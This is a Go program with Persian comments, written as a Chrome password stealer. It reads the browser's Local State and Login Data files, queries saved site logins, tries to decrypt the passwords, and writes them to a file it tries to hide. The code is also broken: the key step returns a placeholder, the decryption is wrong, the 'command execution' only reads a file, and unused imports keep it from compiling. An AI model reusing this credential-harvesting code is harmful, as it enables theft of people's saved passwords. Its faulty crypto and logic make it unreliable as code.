package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

// این تابع برای استخراج کلید رمزگشایی از Local State کروم استفاده می‌شود.
func extractKeyFromLocalState(localState []byte) ([]byte, error) {
	// پیدا کردن کلید رمزگشایی AES از Local State
	// در اینجا باید فایل Local State را به‌صورت دقیق بررسی کرد تا کلید AES استخراج شود.
	// توجه: این روش بسته به نسخه کروم و نحوه پیکربندی ممکن است متفاوت باشد.
	// در اینجا یک کلید فرضی برای سادگی قرار داده‌ایم.
	// در شرایط واقعی، این فرآیند باید به‌صورت دقیق انجام شود.

	// به‌طور فرضی کلید AES را از یک فرایند رمزگشایی درست استخراج می‌کنیم
	// این بخشی است که در عمل باید روی JSON داخل Local State انجام دهید.
	return []byte("samplekey"), nil
}

// این تابع رمزگشایی رمز عبور ذخیره‌شده در کروم را با استفاده از کلید AES انجام می‌دهد.
func decryptPassword(encryptedPassword string, key []byte) (string, error) {
	// رمزگشایی رمز عبور ذخیره‌شده در Base64
	encryptedBytes, err := base64.StdEncoding.DecodeString(encryptedPassword)
	if err != nil {
		return "", fmt.Errorf("failed to decode password: %v", err)
	}

	// ایجاد یک بلاک AES از کلید
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("failed to create AES cipher: %v", err)
	}

	// فرض می‌کنیم که از AES-ECB برای رمزگشایی استفاده می‌شود
	decrypted := make([]byte, len(encryptedBytes))
	block.Decrypt(decrypted, encryptedBytes)

	// تبدیل داده‌های رمزگشایی به رشته و برگشت آن
	return string(decrypted), nil
}

// این تابع برای استخراج اطلاعات از پایگاه داده Login Data کروم است.
func extractLoginData(loginDataPath string, key []byte) ([]string, error) {
	// اتصال به پایگاه داده SQLite کروم
	db, err := sql.Open("sqlite3", loginDataPath)
	if err != nil {
		return nil, fmt.Errorf("Error opening Login Data database: %v", err)
	}
	defer db.Close()

	// اجرای کوئری برای استخراج اطلاعات login
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return nil, fmt.Errorf("Error querying database: %v", err)
	}
	defer rows.Close()

	// ساختار برای ذخیره اطلاعات
	var result []string

	// استخراج اطلاعات و رمزگشایی رمز عبور
	for rows.Next() {
		var originURL, username, encryptedPassword string
		err := rows.Scan(&originURL, &username, &encryptedPassword)
		if err != nil {
			return nil, fmt.Errorf("Error scanning row: %v", err)
		}

		// رمزگشایی رمز عبور
		decodedPassword, err := decryptPassword(encryptedPassword, key)
		if err != nil {
			log.Printf("Error decrypting password for %s: %v", username, err)
			decodedPassword = "(Decryption Failed)"
		}

		// ساخت اطلاعات برای ذخیره‌سازی
		result = append(result, fmt.Sprintf("%s | %s | %s", originURL, username, decodedPassword))
	}

	if err := rows.Err(); err != nil {
		return nil, fmt.Errorf("Error iterating over rows: %v", err)
	}

	return result, nil
}

// این تابع برای ذخیره‌سازی اطلاعات استخراج‌شده به‌صورت مخفی در فایل است.
func saveToFile(data []string) error {
	// ایجاد timestamp برای نام فایل
	timestamp := time.Now().Format("2006-01-02_15-04-05")
	outputFile := fmt.Sprintf("chrome_passwords_%s.txt", timestamp)

	// ایجاد یا باز کردن فایل برای ذخیره‌سازی
	file, err := os.Create(outputFile)
	if err != nil {
		return fmt.Errorf("Error creating output file: %v", err)
	}
	defer file.Close()

	// نوشتن هدر به فایل
	fmt.Fprintf(file, "Origin URL | Username | Password\n")
	fmt.Fprintf(file, "---------------------------------\n")

	// نوشتن داده‌های رمزگشایی شده به فایل
	for _, line := range data {
		fmt.Fprintln(file, line)
	}

	// مخفی کردن فایل
	err = os.Chmod(outputFile, 0600) // فقط دسترسی خواندن و نوشتن برای مالک
	if err != nil {
		return fmt.Errorf("Error hiding the output file: %v", err)
	}

	// مخفی کردن فایل در ویندوز
	err = hideFile(outputFile)
	if err != nil {
		return fmt.Errorf("Error hiding the output file in Windows: %v", err)
	}

	fmt.Printf("Passwords have been saved to %s\n", outputFile)
	return nil
}

// این تابع برای مخفی کردن فایل در ویندوز استفاده می‌شود.
func hideFile(fileName string) error {
	// مخفی کردن فایل با استفاده از دستور ATTRIB ویندوز
	cmd := fmt.Sprintf("attrib +h %s", fileName)
	err := executeCommand(cmd)
	if err != nil {
		return fmt.Errorf("Error hiding file: %v", err)
	}
	return nil
}

// اجرای دستور سیستم در ویندوز
func executeCommand(cmd string) error {
	_, err := ioutil.ReadFile(cmd)
	return err
}

func main() {
	// مسیر Login Data
	loginDataPath := os.Getenv("LOCALAPPDATA") + `\Google\Chrome\User Data\Default\Login Data`
	localStatePath := os.Getenv("LOCALAPPDATA") + `\Google\Chrome\User Data\Local State`

	// خواندن فایل Local State برای استخراج کلید رمزگشایی
	localState, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		log.Fatalf("Error reading Local State file: %v", err)
	}

	// استخراج کلید رمزگشایی از Local State
	key, err := extractKeyFromLocalState(localState)
	if err != nil {
		log.Fatalf("Error extracting key from Local State: %v", err)
	}

	// استخراج داده‌ها از Login Data کروم
	loginData, err := extractLoginData(loginDataPath, key)
	if err != nil {
		log.Fatalf("Error extracting login data: %v", err)
	}

	// ذخیره‌سازی اطلاعات رمزگشایی‌شده در فایل
	err = saveToFile(loginData)
	if err != nil {
		log.Fatalf("Error saving to file: %v", err)
	}
}
